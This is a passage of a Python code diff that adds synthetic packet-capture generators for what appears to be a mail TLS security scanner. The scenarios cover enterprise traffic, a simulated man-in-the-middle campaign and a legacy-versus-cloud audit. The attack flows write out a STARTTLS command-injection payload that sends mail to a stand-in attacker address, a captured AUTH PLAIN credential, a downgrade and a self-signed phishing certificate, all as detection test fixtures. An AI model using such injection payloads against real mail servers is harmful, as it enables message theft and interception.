+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="mail.corp.example.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=31001+len(banner)+len(ehlo_resp)+len(ready_resp), ack=30001+len(ehlo_cmd)+len(injected)+len(ch), ts=_ts(t0, 0.070)))
+        return pkts
+
+    flows = [
+        flow_1(), flow_2(), flow_3(), flow_4(), flow_5(), flow_6(), flow_7(), flow_8(),
+        flow_9(), flow_10(), flow_11(), flow_12(), flow_13(), flow_14(), flow_15(), flow_16(),
+    ]
+    for f in flows:
+        all_pkts.extend(f)
+
+    all_pkts.sort(key=lambda p: float(p.time))
+    out = output_dir / "enterprise_network_simulation.pcap"
+    wrpcap(str(out), all_pkts)
+    return out
+
+
+def _gen_mitm_attack_campaign(output_dir: Path) -> Path:
+    """
+    Enterprise Scenario 2: Active MitM Cyber Attack Campaign (6 Targeted Flows).
+    Simulates a coordinated cyber attack campaign on corporate email channels:
+    STARTTLS stripping, buffer injection exfiltration, cryptographic downgrade,
+    phishing gateway with untrusted self-signed cert, and cleartext relay fallback.
+    """
+    base = 1710100000.0
+    all_pkts = []
+
+    # 1. Executive Victim: Active STARTTLS stripping & credential theft (CRITICAL)
+    def flow_1():
+        c_ip, s_ip, sp, dp = "10.200.1.10", "10.0.0.2", 55101, 587
+        t0 = base + 0.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=1000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=2000, ack=1001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=1001, ack=2001, ts=_ts(t0, 0.003)),
+        ]
+        banner = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, banner, seq=2001, ack=1001, ts=_ts(t0, 0.010)))
+        ehlo = b"EHLO exec-macbook.corp.example.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=1001, ack=2001+len(banner), ts=_ts(t0, 0.020)))
+        ehlo_resp = b"250-mail.corp.example.com\r\n250-AUTH PLAIN LOGIN\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, ehlo_resp, seq=2001+len(banner), ack=1001+len(ehlo), ts=_ts(t0, 0.030)))
+        auth = b"AUTH PLAIN AHRhcmdldEBjb3JwLmV4YW1wbGUuY29tAENvcnBTZWNyZXQyMDI2IQ==\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, auth, seq=1001+len(ehlo), ack=2001+len(banner)+len(ehlo_resp), ts=_ts(t0, 0.040)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"235 Authentication successful\r\n", seq=2001+len(banner)+len(ehlo_resp), ack=1001+len(ehlo)+len(auth), ts=_ts(t0, 0.050)))
+        return pkts
+
+    # 2. Finance Exfiltration: Poddebniak buffer injection attack (CRITICAL)
+    def flow_2():
+        c_ip, s_ip, sp, dp = "198.51.100.99", "10.0.0.2", 48200, 587
+        t0 = base + 1.8
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=3000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=4000, ack=3001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=3001, ack=4001, ts=_ts(t0, 0.003)),
+        ]
+        banner = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, banner, seq=4001, ack=3001, ts=_ts(t0, 0.010)))
+        ehlo = b"EHLO payment-processor.attacker.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=3001, ack=4001+len(banner), ts=_ts(t0, 0.020)))
+        ehlo_resp = b"250-mail.corp.example.com\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, ehlo_resp, seq=4001+len(banner), ack=3001+len(ehlo), ts=_ts(t0, 0.030)))
+        injected = (
+            b"STARTTLS\r\n"
+            b"RSET\r\n"
+            b"MAIL FROM:<cfo@corp.example.com>\r\n"
+            b"RCPT TO:<wire-exfil@attacker.com>\r\n"
+            b"DATA\r\n"
+        )
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, injected, seq=3001+len(ehlo), ack=4001+len(banner)+len(ehlo_resp), ts=_ts(t0, 0.040)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"220 Ready to start TLS\r\n", seq=4001+len(banner)+len(ehlo_resp), ack=3001+len(ehlo)+len(injected), ts=_ts(t0, 0.050)))
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="mail.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=3001+len(ehlo)+len(injected), ack=4001+len(banner)+len(ehlo_resp)+24, ts=_ts(t0, 0.060)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="mail.corp.example.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=4001+len(banner)+len(ehlo_resp)+24, ack=3001+len(ehlo)+len(injected)+len(ch), ts=_ts(t0, 0.070)))
+        return pkts
+
+    # 3. HR Department Forced Downgrade: Intercepted and forced to TLS 1.0, 3DES, SHA-1 cert (HIGH)
+    def flow_3():
+        c_ip, s_ip, sp, dp = "10.200.1.25", "10.0.0.2", 55103, 587
+        t0 = base + 3.2
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=5000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=6000, ack=5001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=5001, ack=6001, ts=_ts(t0, 0.003)),
+        ]
+        b1 = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=6001, ack=5001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO hr-payroll.corp.example.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=5001, ack=6001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-mail.corp.example.com\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=6001+len(b1), ack=5001+len(ehlo), ts=_ts(t0, 0.020)))
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, b"STARTTLS\r\n", seq=5001+len(ehlo), ack=6001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"220 Ready to start TLS\r\n", seq=6001+len(b1)+len(r1), ack=5001+len(ehlo)+10, ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0301, cipher_suites=[0x000A], sni="mail.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=5001+len(ehlo)+10, ack=6001+len(b1)+len(r1)+24, ts=_ts(t0, 0.040)))
+        sh = _server_hello(version=0x0301, cipher_suite=0x000A)
+        cert = _build_cert_msg(subject_cn="mail.corp.example.com", is_sha1_sig=True)
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=6001+len(b1)+len(r1)+24, ack=5001+len(ehlo)+10+len(ch), ts=_ts(t0, 0.050)))
+        return pkts
+
+    # 4. Phishing Proxy: IMAPS with untrusted self-signed cert & SNI mismatch (MEDIUM/HIGH)
+    def flow_4():
+        c_ip, s_ip, sp, dp = "10.200.1.50", "10.0.0.1", 55105, 993
+        t0 = base + 4.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=7000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=8000, ack=7001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=7001, ack=8001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="evil-phish.attacker.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=7001, ack=8001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="evil-phish.attacker.com", is_self_signed=True, san_list=["evil-phish.attacker.com"])
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=8001, ack=7001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 5. Cleartext Fallback Relay: Port 25 cleartext mail transmission without TLS (CRITICAL)
+    def flow_5():
+        c_ip, s_ip, sp, dp = "10.200.1.75", "10.0.0.4", 55107, 25
+        t0 = base + 5.8
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=9000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=10000, ack=9001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=9001, ack=10001, ts=_ts(t0, 0.003)),
+        ]
+        b1 = b"220 relay.corp.example.com ESMTP Sendmail\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=10001, ack=9001, ts=_ts(t0, 0.010)))
+        ehlo = b"EHLO unencrypted-node.attacker.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=9001, ack=10001+len(b1), ts=_ts(t0, 0.020)))
+        r1 = b"250-relay.corp.example.com\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=10001+len(b1), ack=9001+len(ehlo), ts=_ts(t0, 0.030)))
+        mail = b"MAIL FROM:<exfil@attacker.com>\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, mail, seq=9001+len(ehlo), ack=10001+len(b1)+len(r1), ts=_ts(t0, 0.040)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"250 2.1.0 Ok\r\n", seq=10001+len(b1)+len(r1), ack=9001+len(ehlo)+len(mail), ts=_ts(t0, 0.050)))
+        return pkts
+
+    # 6. SOC Reference Session: Hardened uncompromised IMAPS baseline (LOW)
+    def flow_6():
+        c_ip, s_ip, sp, dp = "10.200.1.5", "10.0.0.1", 55100, 993
+        t0 = base + 7.0
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=11000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=12000, ack=11001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=11001, ack=12001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1302, 0x1301], sni="imap.corp.example.com", alpn_protocols=[b"imap"])
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=11001, ack=12001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1302)
+        cert = _build_cert_msg(subject_cn="imap.corp.example.com", san_list=["imap.corp.example.com"])
+        ccs = _change_cipher_spec()
+        app = _app_data(b"* OK [CAPABILITY IMAP4rev1] SOC Secure Ready\r\n")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert + ccs + app, seq=12001, ack=11001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    flows = [flow_1(), flow_2(), flow_3(), flow_4(), flow_5(), flow_6()]
+    for f in flows:
+        all_pkts.extend(f)
+
+    all_pkts.sort(key=lambda p: float(p.time))
+    out = output_dir / "mitm_attack_campaign.pcap"
+    wrpcap(str(out), all_pkts)
+    return out
+
+
+def _gen_cloud_migration_audit(output_dir: Path) -> Path:
+    """
+    Enterprise Scenario 3: Cloud Migration & Technical Debt Posture Audit (8 Mixed Flows).
+    Simulates a hybrid enterprise during cloud migration:
+    Modern cloud endpoints (TLS 1.3, PQC ready, valid CA certs) vs on-premise
+    technical debt (TLS 1.0, 3DES, expired certs, cleartext ERP, weak 1024-bit RSA).
+    """
+    base = 1710200000.0
+    all_pkts = []
+
+    # 1. Cloud Outbound Submission: TLS 1.3, PQC Hybrid ready (LOW)
+    def flow_1():
+        c_ip, s_ip, sp, dp = "172.16.10.10", "172.16.1.10", 56001, 587
+        t0 = base + 0.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=1000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=2000, ack=1001, ts=_ts(t0, 0.001)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=1001, ack=2001, ts=_ts(t0, 0.002)),
+        ]
+        b1 = b"220 cloud-smtp.enterprise.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=2001, ack=1001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO cloud-client.enterprise.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=1001, ack=2001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-cloud-smtp.enterprise.com\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=2001+len(b1), ack=1001+len(ehlo), ts=_ts(t0, 0.020)))
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, b"STARTTLS\r\n", seq=1001+len(ehlo), ack=2001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"220 Ready to start TLS\r\n", seq=2001+len(b1)+len(r1), ack=1001+len(ehlo)+10, ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1302, 0x1301], sni="cloud-smtp.enterprise.com", named_groups=[0x11EC, 0x001D, 0x0017])
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=1001+len(ehlo)+10, ack=2001+len(b1)+len(r1)+24, ts=_ts(t0, 0.038)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1302)
+        cert = _build_cert_msg(subject_cn="cloud-smtp.enterprise.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=2001+len(b1)+len(r1)+24, ack=1001+len(ehlo)+10+len(ch), ts=_ts(t0, 0.045)))
+        return pkts
+
+    # 2. Cloud Webmail IMAP: TLS 1.3 AES-256-GCM (LOW)
+    def flow_2():
+        c_ip, s_ip, sp, dp = "172.16.10.15", "172.16.1.11", 56002, 993
+        t0 = base + 1.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=3000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=4000, ack=3001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=3001, ack=4001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1302], sni="imap.cloud.enterprise.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=3001, ack=4001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1302)
+        cert = _build_cert_msg(subject_cn="imap.cloud.enterprise.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=4001, ack=3001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 3. Cloud Mobile Sync: IMAPS TLS 1.3 (LOW)
+    def flow_3():
+        c_ip, s_ip, sp, dp = "172.16.10.20", "172.16.1.11", 56003, 993
+        t0 = base + 2.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=5000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=6000, ack=5001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=5001, ack=6001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1302], sni="imap.cloud.enterprise.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=5001, ack=6001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1302)
+        cert = _build_cert_msg(subject_cn="imap.cloud.enterprise.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=6001, ack=5001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 4. Cloud Inbound MX Relay: Port 25 STARTTLS TLS 1.2 ECDHE (LOW)
+    def flow_4():
+        c_ip, s_ip, sp, dp = "198.51.100.40", "172.16.1.12", 56004, 25
+        t0 = base + 3.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=7000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=8000, ack=7001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=7001, ack=8001, ts=_ts(t0, 0.003)),
+        ]
+        b1 = b"220 mx1.cloud.enterprise.com ESMTP Sendmail\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=8001, ack=7001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO partner-mx.global.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=7001, ack=8001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-mx1.cloud.enterprise.com\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=8001+len(b1), ack=7001+len(ehlo), ts=_ts(t0, 0.020)))
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, b"STARTTLS\r\n", seq=7001+len(ehlo), ack=8001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"220 Ready to start TLS\r\n", seq=8001+len(b1)+len(r1), ack=7001+len(ehlo)+10, ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="mx1.cloud.enterprise.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=7001+len(ehlo)+10, ack=8001+len(b1)+len(r1)+24, ts=_ts(t0, 0.038)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="mx1.cloud.enterprise.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=8001+len(b1)+len(r1)+24, ack=7001+len(ehlo)+10+len(ch), ts=_ts(t0, 0.045)))
+        return pkts
+
+    # 5. On-Premise Legacy Exchange 2010: Port 587, TLS 1.0, 3DES, SHA-1 cert (HIGH)
+    def flow_5():
+        c_ip, s_ip, sp, dp = "172.16.20.5", "172.16.1.10", 49201, 587
+        t0 = base + 4.8
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=9000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=10000, ack=9001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=9001, ack=10001, ts=_ts(t0, 0.003)),
+        ]
+        b1 = b"220 legacy-ex2010.corp.local ESMTP Microsoft Exchange\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=10001, ack=9001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO legacy-client.corp.local\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=9001, ack=10001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-legacy-ex2010.corp.local\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=10001+len(b1), ack=9001+len(ehlo), ts=_ts(t0, 0.020)))
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, b"STARTTLS\r\n", seq=9001+len(ehlo), ack=10001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"220 Ready to start TLS\r\n", seq=10001+len(b1)+len(r1), ack=9001+len(ehlo)+10, ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0301, cipher_suites=[0x000A], sni="legacy-ex2010.corp.local")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=9001+len(ehlo)+10, ack=10001+len(b1)+len(r1)+24, ts=_ts(t0, 0.040)))
+        sh = _server_hello(version=0x0301, cipher_suite=0x000A)
+        cert = _build_cert_msg(subject_cn="legacy-ex2010.corp.local", is_sha1_sig=True)
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=10001+len(b1)+len(r1)+24, ack=9001+len(ehlo)+10+len(ch), ts=_ts(t0, 0.050)))
+        return pkts
+
+    # 6. On-Premise Legacy Branch Server: Port 993, Expired cert (MEDIUM)
+    def flow_6():
+        c_ip, s_ip, sp, dp = "172.16.20.12", "172.16.1.11", 49202, 993
+        t0 = base + 5.8
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=11000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=12000, ack=11001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=11001, ack=12001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="branch-legacy.corp.local")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=11001, ack=12001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="branch-legacy.corp.local", expired=True)
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=12001, ack=11001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 7. On-Premise Legacy ERP System: Port 25 cleartext plaintext submission without TLS (CRITICAL)
+    def flow_7():
+        c_ip, s_ip, sp, dp = "172.16.20.30", "172.16.1.12", 49203, 25
+        t0 = base + 6.8
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=13000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=14000, ack=13001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=13001, ack=14001, ts=_ts(t0, 0.003)),
+        ]
+        b1 = b"220 legacy-mta.corp.local ESMTP Sendmail\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=14001, ack=13001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO erp-database.corp.local\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=13001, ack=14001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-legacy-mta.corp.local\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=14001+len(b1), ack=13001+len(ehlo), ts=_ts(t0, 0.020)))
+        mail = b"MAIL FROM:<erp-billing@corp.local>\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, mail, seq=13001+len(ehlo), ack=14001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"250 2.1.0 Ok\r\n", seq=14001+len(b1)+len(r1), ack=13001+len(ehlo)+len(mail), ts=_ts(t0, 0.030)))
+        return pkts
+
+    # 8. On-Premise Legacy Copier: Port 587, TLS 1.2 with weak 1024-bit RSA key (CERT-004)
+    def flow_8():
+        c_ip, s_ip, sp, dp = "172.16.20.45", "172.16.1.10", 49204, 587
+        t0 = base + 7.8
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=15000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=16000, ack=15001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=15001, ack=16001, ts=_ts(t0, 0.003)),
+        ]
+        b1 = b"220 legacy-ex2010.corp.local ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=16001, ack=15001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO floor3-copier.corp.local\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=15001, ack=16001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-legacy-ex2010.corp.local\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=16001+len(b1), ack=15001+len(ehlo), ts=_ts(t0, 0.020)))
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, b"STARTTLS\r\n", seq=15001+len(ehlo), ack=16001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"220 Ready to start TLS\r\n", seq=16001+len(b1)+len(r1), ack=15001+len(ehlo)+10, ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="floor3-copier.corp.local")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=15001+len(ehlo)+10, ack=16001+len(b1)+len(r1)+24, ts=_ts(t0, 0.038)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="floor3-copier.corp.local", key_size=1024)
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=16001+len(b1)+len(r1)+24, ack=15001+len(ehlo)+10+len(ch), ts=_ts(t0, 0.045)))
+        return pkts
+
+    flows = [flow_1(), flow_2(), flow_3(), flow_4(), flow_5(), flow_6(), flow_7(), flow_8()]
+    for f in flows:
+        all_pkts.extend(f)
+
+    all_pkts.sort(key=lambda p: float(p.time))
+    out = output_dir / "cloud_migration_audit.pcap"
+    wrpcap(str(out), all_pkts)
+    return out
+
+
 # ---------------------------------------------------------------------------
 # Generator Registries
 # ---------------------------------------------------------------------------
@@ -1416,6 +2118,12 @@ TIER3_GENERATORS: Dict[str, Callable[[Path], Path]] = {
     "cert_sni_mismatch":             _gen_cert_sni_mismatch,
 }
 
+ENTERPRISE_GENERATORS: Dict[str, Callable[[Path], Path]] = {
+    "enterprise_network_simulation": _gen_enterprise_network_simulation,
+    "mitm_attack_campaign":          _gen_mitm_attack_campaign,
+    "cloud_migration_audit":         _gen_cloud_migration_audit,
+}
+
 ALL_SCENARIO_GENERATORS: Dict[str, Callable[[Path], Path]] = {
     **TIER1_GENERATORS,
     **TIER2_GENERATORS,
@@ -1441,6 +2149,15 @@ _SAMPLE_DESCRIPTIONS = {
     "malformed_tls_record_length": "🔬 Corrupted TLS record length header (isolation boundary)",
     "cert_weak_rsa1024":           "⚠️ Deprecated 1024-bit RSA key certificate (CERT-004)",
     "cert_sni_mismatch":           "⚠️ SNI hostname mismatch against certificate SAN (CERT-009)",
+    "enterprise_network_simulation": "🏢 Enterprise Mail Gateway Perimeter (16 Flows · Corporate, Branch, Attacks & PQC)",
+    "mitm_attack_campaign":          "🚨 Active MitM Attack & Exploit Campaign (6 Flows · Stripping, Injection & Downgrade)",
+    "cloud_migration_audit":         "☁️ Cloud Migration & Technical Debt Posture Audit (8 Flows · Cloud vs Legacy Fleet)",
+}
+
+_ENTERPRISE_DESCRIPTIONS = {
+    "enterprise_network_simulation": "🏢 Enterprise Mail Gateway Perimeter (16 Flows · Corporate, Branch, Attacks & PQC)",
+    "mitm_attack_campaign":          "🚨 Active MitM Attack & Exploit Campaign (6 Flows · Stripping, Injection & Downgrade)",
+    "cloud_migration_audit":         "☁️ Cloud Migration & Technical Debt Posture Audit (8 Flows · Cloud vs Legacy Fleet)",
 }
 
 
@@ -1556,6 +2273,8 @@ def generate_all(
         generators = TIER2_GENERATORS
     elif tier.lower() in ("3", "tier3"):
         generators = TIER3_GENERATORS
+    elif tier.lower() in ("enterprise", "simulations", "multi"):
+        generators = ENTERPRISE_GENERATORS
     elif tier.lower() in ("all", "full"):
         generators = ALL_SCENARIO_GENERATORS
     else:
@@ -1588,6 +2307,29 @@ def generate_all(
     return results
 
 
+def generate_enterprise_simulations(output_dir: str | Path = DEFAULT_OUTPUT_DIR) -> Dict[str, Path]:
